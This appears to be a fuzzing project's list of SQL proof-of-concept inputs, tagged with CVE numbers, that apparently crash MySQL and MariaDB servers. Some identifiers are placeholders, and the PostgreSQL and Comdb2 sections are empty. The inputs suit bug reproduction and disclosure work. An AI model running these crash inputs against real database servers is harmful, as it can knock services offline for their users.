MySQL:
1. The PoC of CVE-XXX-35644
CREATE TABLE v0 (v2 MEDIUMINT PRIMARY KEY , v1 MEDIUMTEXT ) ;
INSERT INTO v0 (v3. *) VALUES (DEFAULT,DEFAULT) ;
SELECT * FROM v0 WHERE v1 IN (255,15,83/97) ;
SELECT * FROM v3 WHERE v1 IN (MINUTE(FALSE),-1/255) ;

2. The PoC of CVE-XXXX-21303
CREATE TABLE v0 ( v2 INT UNIQUE KEY STORAGE DEFAULT COMMENT 'x' SERIAL DEFAULT VALUE , v1 BINARY ( 0 ) ) ;
CREATE UNIQUE INDEX PACK_KEYS ON v0 ( ( ( CASE 'x' WHEN v1 THEN v1 ELSE 60 / 0 END ) IS NOT FALSE ) DESC ) ;
SELECT * FROM v0 AS x WHERE v2 IN ( 8 , 50 , 37 ) ;
SELECT * FROM v0 WHERE v1 IN ( v1 IN ( 'x' * 'x' ) , -1 ) ;

3. The PoC of CVE-2022-21304
CREATE TABLE v0 ( v1 SERIAL AS ( '' IS UNKNOWN ) ) ;
CREATE TABLE v2 AS SELECT ( ( v1 BETWEEN 127 AND -1 ) + v1 AND 'x' ) LIMIT 92 OFFSET 2147483647 ;
CREATE TABLE v3 ( v5 INT PRIMARY KEY , v4 INT ) ;
INSERT INTO v2 ( ) VALUES ( 95 ) , ( 0 ) ;
SELECT * FROM v0 , v3 WHERE 'x' ;


MariaDB:
1. CREATE TABLE v0 ( v2 SET ( 'x' ) DEFAULT 'x' , v1 BIGINT ) ENGINE = MEMORY ROW_FORMAT = COMPRESSED ( SELECT 35268330.000000 AS v3 , 3 ) ;
START TRANSACTION ;
SELECT * FROM v0 WHERE v1 = ( bit_count ( 'x' ) AND 0 ) ;
INSERT INTO v0 SELECT * FROM v0 ;
UPDATE v0 SET v1 = v3 + 52 ORDER BY ( SELECT v3 LIMIT 53 OFFSET 16 ) DESC ;
INSERT INTO v0 SELECT TABLE_NAME FROM v0 . PARTITIONS WHERE v2 = 'x' GROUP BY 'x' BETWEEN 'x' AND 'x' = 'x' ;
2.  CREATE TABLE t1 (i int AS ('x') stored, j int)engine=innodb;
SHOW LOCAL STATUS WHERE COALESCE ( 27 , 51 - 39 ) = 'x' ;
DELETE FROM v0 WHERE 44707452.000000 ;
ALTER TABLE t1 ADD COLUMN i INT GENERATED ALWAYS AS ('a'), DROP COLUMN i ;
SELECT COUNT ( * ) FROM v0 WHERE v1 = -128 AND v1 = 'x' ;
3. CREATE TABLE v0 (v1 BIT, v2 BIT, v3 BIT, v4 BIT , v5 BIT, v6 BIT);
INSERT INTO v0 VALUES (1,0,0,1,0,1),(0,1,0,0,1,0);
SELECT v1 from v0 order by row_number() over (ORDER BY V6) + 1;
DROP TABLE V0;


PostgreSQL:
1. 



Comdb2:




